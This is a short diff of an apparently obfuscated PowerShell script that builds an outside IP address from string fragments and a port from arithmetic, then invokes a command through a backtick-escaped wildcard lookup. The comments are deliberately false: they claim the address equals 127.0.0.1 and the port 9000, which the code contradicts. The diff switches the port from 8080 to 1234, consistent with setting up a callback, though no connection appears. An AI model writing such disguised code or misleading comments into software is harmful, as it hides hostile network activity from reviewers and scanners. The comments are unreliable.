@@ -2,7 +2,7 @@
 # obfuscated host address, same as $a = "127.0.0.1";
 $a = "35" + "." + "176" + "." + "12" + "." + "203";
 # obfuscated port number, same as $p = 9000;
-$p = 0 + 8000 + 80 + 0;
+$p = 1000 + 200 + 30 + 4;
 & (`G`C`M *e-Ho??);
 & (`G`C`M *e-Ho??);
 & (`G`C`M *e-Ho??);
